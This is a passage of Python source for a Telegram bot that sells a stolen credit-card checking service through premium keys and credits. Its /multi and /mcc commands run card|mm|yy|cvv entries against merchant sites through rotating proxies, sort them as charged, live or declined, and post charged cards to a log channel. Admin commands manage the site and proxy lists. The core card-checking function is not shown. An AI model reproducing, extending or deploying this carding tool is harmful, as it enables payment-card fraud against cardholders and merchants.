    args = event.text.split(maxsplit=1)
    if len(args) < 2: return await event.reply("❌ Usage: /addsite site.com")
    ok, msg = add_site(args[1].strip())
    await event.reply(f"{'✅' if ok else '❌'} {msg}")

@dp.message(Command("getsites"))
async def get_sites(event: Message):
    if not is_admin(event.from_user.id): return
    sites = load_sites()
    if not sites: return await event.reply("❌ No sites available.")
    site_list = "\n".join([f"{i+1}. <code>{s}</code>" for i, s in enumerate(sites)])
    await event.reply(f"<b>📋 Sites ({len(sites)}):</b>\n\n{site_list}")

@dp.message(Command("clearsite"))
async def clear_sites(event: Message):
    if not is_admin(event.from_user.id): return
    with open(SITES_FILE, 'w') as f: f.write("")
    await event.reply("✅ Cleared all sites.")

@dp.message(Command("proxy"))
async def proxy_command(event: Message):
    if not is_admin(event.from_user.id): return
    proxies = load_proxies()
    if not proxies: return await event.reply("❌ proxy.txt is empty.")
    status_msg = await event.reply(f"🔥 Checking {len(proxies)} proxies...")
    alive, dead = [], []
    for p in proxies:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get('https://httpbin.org/ip', proxy=f"http://{p}", timeout=10) as resp:
                    if resp.status == 200: alive.append(p)
                    else: dead.append(p)
        except: dead.append(p)
    with open(PROXY_FILE, 'w') as f:
        for p in alive: f.write(f"{p}\n")
    await status_msg.edit_text(f"✅ Proxies Checked: {len(alive)} alive, {len(dead)} removed.")

@dp.message(Command("addproxy"))
async def add_proxy_command(event: Message):
    if not is_admin(event.from_user.id): return
    args = event.text.split('\n')
    if len(args) < 2: return await event.reply("❌ Usage: `/addproxy` followed by proxies on new lines.")
    proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
    current = load_proxies()
    added = [p for p in proxies_to_add if p not in current]
    if not added: return await event.reply("⚠️ All provided proxies already exist.")
    with open(PROXY_FILE, 'a') as f:
        for p in added: f.write(f"{p}\n")
    await event.reply(f"✅ Added {len(added)} new proxies.")

@dp.message(Command("getproxy"))
async def get_proxies(event: Message):
    if not is_admin(event.from_user.id): return
    proxies = load_proxies()
    if not proxies: return await event.reply("❌ No proxies available.")
    proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
    await event.reply(f"<b>📋 Proxies ({len(proxies)}):</b>\n\n{proxy_list}")

@dp.message(Command("clearproxy"))
async def clear_proxies(event: Message):
    if not is_admin(event.from_user.id): return
    with open(PROXY_FILE, 'w') as f: f.write("")
    await event.reply("✅ Cleared all proxies.")

@dp.message(Command("ban"))
async def ban_user_admin(event: Message):
    if not is_admin(event.from_user.id): return
    args = event.text.split()
    if len(args) != 2: return await event.reply("❌ Usage: /ban user_id")
    try:
        uid = int(args[1])
        ban_user(uid)
        await event.reply(f"✅ Banned {uid}.")
    except: await event.reply("❌ Invalid ID.")

@dp.message(Command("unban"))
async def unban_user_admin(event: Message):
    if not is_admin(event.from_user.id): return
    args = event.text.split()
    if len(args) != 2: return await event.reply("❌ Usage: /unban user_id")
    try:
        uid = int(args[1])
        unban_user(uid)
        await event.reply(f"✅ Unbanned {uid}.")
    except: await event.reply("❌ Invalid ID.")

@dp.message(Command("stats"))
async def stats(event: Message):
    if not is_admin(event.from_user.id): return
    users = len(load_json(PREMIUM_FILE))
    credits = sum(load_json(CREDITS_FILE).values())
    keys = len(load_json(KEYS_FILE))
    sites = len(load_sites())
    proxies = len(load_proxies())
    await event.reply(f"<b>📊 Stats</b>\nPremium Users: {users}\nTotal Credits: {credits}\nKeys: {keys}\nSites: {sites}\nProxies: {proxies}")

# ========== MULTI, MCC, USER PROXY, GROUP MODE, REDEEM ==========

@dp.message(Command("multi"))
async def multi_cc_check(event: Message):
    uid = event.from_user.id
    if is_banned(uid): return
    if not is_premium(uid) and not is_admin(uid): return await event.reply("❌ <b>Premium Required!</b>")
    
    cc_input = event.text.replace('/multi', '', 1).strip()
    if not cc_input:
        if event.reply_to_message and event.reply_to_message.document:
            file_path = await bot.download(event.reply_to_message.document)
            async with aiofiles.open(file_path.name, 'r', encoding='utf-8', errors='ignore') as f:
                cc_input = await f.read()
            os.remove(file_path.name)
    
    cards = extract_cc(cc_input)
    if not cards: return await event.reply("❌ <b>Invalid Format.</b> Use: <code>/multi card1|mm|yy|cvv card2 ...</code>")
    if len(cards) > 10: cards = cards[:10]
    if get_user_credits(uid) < len(cards): return await event.reply(f"❌ Need {len(cards)} credits.")
    
    status_msg = await event.reply(f"<b>𝐌𝐮𝐥𝐭𝐢 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 ⚡</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n⏳ Starting check for {len(cards)} cards...")
    
    charged, approved, dead = [], [], []
    for i, card in enumerate(cards):
        res = await check_card_with_retry(card, load_sites(), load_proxies())
        deduct_credit(uid)
        
        if res['status'] == 'Charged':
            charged.append(res)
            await send_log_to_channel(res['message'], res.get('gateway', '-'), res.get('price', '-'), event.from_user.username, uid)
        elif res['status'] == 'Approved': approved.append(res)
        else: dead.append(res)
        
        if (i + 1) % 2 == 0 or (i + 1) == len(cards):
            prog = f"<b>𝐌𝐮𝐥𝐭𝐢 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 ⚡</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n<b>Progress ➠</b> {i+1}/{len(cards)}\n<b>Charged 🔥 ➠</b> {len(charged)}\n<b>Approved ✅ ➠</b> {len(approved)}\n<b>Declined ❌ ➠</b> {len(dead)}"
            try: await status_msg.edit_text(prog)
            except: pass

    final = f"<b>𝐌𝐮𝐥𝐭𝐢 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n✅ {len(charged)} | 🔥 {len(approved)} | ❌ {len(dead)}"
    if charged: final += "\n\n<b>CHARGED:</b>\n" + "\n".join([f"<code>{x['card']}</code>" for x in charged[:5]])
    if approved: final += "\n\n<b>LIVE:</b>\n" + "\n".join([f"<code>{x['card']}</code>" for x in approved[:5]])
    await status_msg.edit_text(final)

@dp.message(Command("mcc"))
async def mass_site_check(event: Message):
    uid = event.from_user.id
    if is_banned(uid): return
    if not is_premium(uid) and not is_admin(uid): return await event.reply("❌ <b>Premium Required!</b>")
    
    user_proxies = get_user_specific_proxies(uid)
    if not user_proxies and not is_admin(uid): return await event.reply("❌ <b>Set your proxy first using /setproxy</b>")
    
    cards = extract_cc(event.text.replace('/mcc', '', 1).strip())
    if not cards: return await event.reply("❌ Invalid Format.")
    card = cards[0]
    
    sites = load_sites()
    proxies = user_proxies if user_proxies else load_proxies()
    if not sites: return await event.reply("❌ No sites available.")
    if get_user_credits(uid) < 1: return await event.reply("❌ No credits.")
    
    status_msg = await event.reply(f"<b>𝐌𝐚𝐬𝐬 𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 ⚡</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n⏳ Checking 1 card against {len(sites)} sites...")
    
    charged, approved, dead = [], [], []
    for i, site in enumerate(sites):
        res = await check_card(card, site, random.choice(proxies))
        if res['status'] == 'Charged':
            charged.append(res)
            await send_log_to_channel(res['message'], res.get('gateway', '-'), res.get('price', '-'), event.from_user.username, uid)
        elif res['status'] == 'Approved': approved.append(res)
        else: dead.append(res)
        
        if (i + 1) % 5 == 0 or (i + 1) == len(sites):
            prog = f"<b>𝐌𝐚𝐬𝐬 𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 ⚡</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n<b>Progress ➠</b> {i+1}/{len(sites)}\n<b>Charged 🔥 ➠</b> {len(charged)}\n<b>Approved ✅ ➠</b> {len(approved)}\n<b>Declined ❌ ➠</b> {len(dead)}"
            try: await status_msg.edit_text(prog)
            except: pass
            
    deduct_credit(uid)
    final = f"<b>𝐌𝐚𝐬𝐬 𝐒𝐢𝐭𝐞 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n✅ {len(charged)} | 🔥 {len(approved)} | ❌ {len(dead)}"
    await status_msg.edit_text(final)

@dp.message(Command("setproxy"))
async def setproxy_command(event: Message):
    uid = event.from_user.id
    if is_banned(uid): return
    args = event.text.split(maxsplit=1)
    if len(args) < 2: return await event.reply("❌ Usage: <code>/setproxy ip:port</code>")
    proxy = args[1].strip()
    if add_user_proxy(uid, proxy):
        await event.reply(f"✅ <b>Proxy added!</b>\n\n<code>{proxy}</code>")
    else:
        await event.reply(f"⚠️ <b>Proxy already exists!</b>")

@dp.message(Command("myproxy"))
async def myproxy_command(event: Message):
    uid = event.from_user.id
    if is_banned(uid): return
    proxies = get_user_specific_proxies(uid)
    if not proxies: return await event.reply("❌ <b>You have no proxies set!</b>")
    proxy_list = "\n".join([f"<code>{p}</code>" for p in proxies])
    await event.reply(f"<b>🔍 Your Proxies:</b>\n\n{proxy_list}")

@dp.message(Command("delmyproxy"))
async def delmyproxy_command(event: Message):
    uid = event.from_user.id
    if is_banned(uid): return
    args = event.text.split(maxsplit=1)
    if len(args) < 2: return await event.reply("❌ Usage: <code>/delmyproxy ip:port</code>")
    proxy = args[1].strip()
    if remove_user_proxy(uid, proxy):
        await event.reply(f"✅ <b>Proxy removed!</b>")
    else:
        await event.reply(f"❌ <b>Proxy not found!</b>")

@dp.message(Command("clearmyproxy"))
async def clearmyproxy_command(event: Message):
    uid = event.from_user.id
    if is_banned(uid): return
    if clear_user_proxies(uid):
        await event.reply("✅ <b>All your proxies cleared!</b>")
    else:
        await event.reply("⚠️ <b>You have no proxies.</b>")

@dp.message(Command("groupmode"))
async def groupmode_command(event: Message):
    if not is_admin(event.from_user.id): return
    if not event.chat.type in ["group", "supergroup"]: return await event.reply("❌ Only works in groups.")
    args = event.text.split()
    if len(args) < 2: return await event.reply("❌ Usage: /groupmode on/off")
    action = args[1].lower()
    if action == 'on':
        set_group_enabled(event.chat.id, True)
        await event.reply("✅ <b>Bot enabled in this group!</b>")
    elif action == 'off':
        set_group_enabled(event.chat.id, False)
        await event.reply("✅ <b>Bot disabled in this group!</b>")
    else:
        await event.reply("❌ Usage: /groupmode on/off")

@dp.message(Command("redeem"))
async def redeem_premium_key_command(event: Message):
    uid = event.from_user.id
    if is_banned(uid): return await event.reply("🚫 You are banned!")
    args = event.text.split()
    if len(args) != 2: return await event.reply("❌ Usage: <code>/redeem PREMIUM_KEY</code>")
    key = args[1].strip().upper()
    success, msg = redeem_premium_key(key, uid)
    if success:
        await event.reply(f"✅ <b>{msg}</b>\n\n💰 Your Credits: {get_user_credits(uid)}")
    else:
        await event.reply(f"❌ <b>{msg}</b>")

@dp.message(Command("redeemcredit"))
async def redeem_credit_key_command(event: Message):
    uid = event.from_user.id
    if is_banned(uid): return await event.reply("🚫 You are banned!")
    args = event.text.split()
    if len(args) != 2: return await event.reply("❌ Usage: <code>/redeemcredit CREDIT_KEY</code>")
    key = args[1].strip().upper()
    success, credits = redeem_credit_key(key, uid)
    if success:
        await event.reply(f"✅ <b>Credit Key Redeemed!</b>\n\n💰 Added: {credits} credits\n💳 Total: {get_user_credits(uid)}")
    else:
        await event.reply(f"❌ <b>{credits}</b>")

# ========== RUN BOT ==========
async def main():
    print("✅ Bot is running...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
